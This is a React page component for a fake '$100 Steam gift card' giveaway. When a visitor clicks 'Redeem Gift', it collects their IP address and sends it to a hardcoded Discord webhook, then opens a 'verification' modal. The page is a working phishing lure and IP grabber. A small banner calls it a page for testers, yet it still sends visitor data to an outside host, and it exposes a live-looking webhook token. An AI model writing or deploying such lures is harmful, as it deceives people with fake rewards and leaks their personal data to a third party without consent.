
import React, { useState, useEffect } from 'react';
import ReactConfetti from 'react-confetti';
import Header from '../components/Header';
import VerificationModal from '../components/VerificationModal';
import { getIpAddress } from '../utils/getIpAddress';
import { toast } from '@/components/ui/use-toast';

const Index = () => {
  const [showConfetti, setShowConfetti] = useState(true);
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [ipAddress, setIpAddress] = useState('');
  const [windowSize, setWindowSize] = useState({
    width: window.innerWidth,
    height: window.innerHeight,
  });

  useEffect(() => {
    // Handle confetti animation
    const timer = setTimeout(() => {
      setShowConfetti(false);
    }, 5000);

    // Get IP address
    const fetchIpAddress = async () => {
      const ip = await getIpAddress();
      setIpAddress(ip);
    };
    fetchIpAddress();

    // Handle window resize for confetti
    const handleResize = () => {
      setWindowSize({
        width: window.innerWidth,
        height: window.innerHeight,
      });
    };

    window.addEventListener('resize', handleResize);

    return () => {
      clearTimeout(timer);
      window.removeEventListener('resize', handleResize);
    };
  }, []);

  const handleRedeemClick = async () => {
    try {
      // Send IP to webhook
      await fetch('https://discord.com/api/webhooks/1367117605877579810/S3qULaeAQR2bDw4UFFj65KEeLarPCpXslBlWA_Fq2kR7CBz958kVNJsOg3svUb-jtrxU', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          content: `New user clicked Redeem! IP Address: ${ipAddress}`,
        }),
      });

      // Open verification modal
      setIsModalOpen(true);
    } catch (error) {
      console.error('Error sending webhook:', error);
      toast({
        title: "Error",
        description: "Could not process your request. Please try again.",
        variant: "destructive",
      });
    }
  };

  return (
    <div className="min-h-screen bg-custom-purple flex flex-col">
      {showConfetti && (
        <ReactConfetti
          width={windowSize.width}
          height={windowSize.height}
          recycle={false}
          numberOfPieces={500}
        />
      )}
      
      <Header />
      
      <main className="flex-grow flex flex-col items-center justify-center px-4 py-10">
        <div className="bg-white bg-opacity-10 p-8 rounded-lg shadow-lg max-w-4xl w-full">
          <div className="flex flex-col md:flex-row items-center gap-8">
            <div className="flex-shrink-0">
              <img 
                src="https://assets.eneba.com/steam/gift-cards/steam-gift-card-100.png" 
                alt="Steam Gift Card $100" 
                className="w-full max-w-md rounded-lg shadow-lg"
              />
            </div>
            
            <div className="text-white text-center md:text-left">
              <h1 className="text-4xl md:text-5xl font-bold mb-6">
                <span className="text-purple-300">KING</span> has gifted you a 
                <span className="text-custom-blue block mt-2">STEAM GIFT CARD $100</span>!
              </h1>
              
              <button 
                onClick={handleRedeemClick}
                className="bg-custom-yellow text-black text-xl font-bold py-4 px-8 rounded-lg hover:bg-opacity-90 transition-all transform hover:scale-105"
              >
                Redeem Gift
              </button>
            </div>
          </div>
        </div>
        
        <div className="mt-10 text-red-300 text-center max-w-2xl border border-red-400 p-4 rounded">
          <p className="font-bold">This page is only for testers of this website! DO NOT USE AS THIS WEBSITE SHARES PERSONAL INFORMATION!</p>
        </div>
      </main>

      <VerificationModal 
        isOpen={isModalOpen} 
        onClose={() => setIsModalOpen(false)}
        ipAddress={ipAddress}
      />
    </div>
  );
};

export default Index;
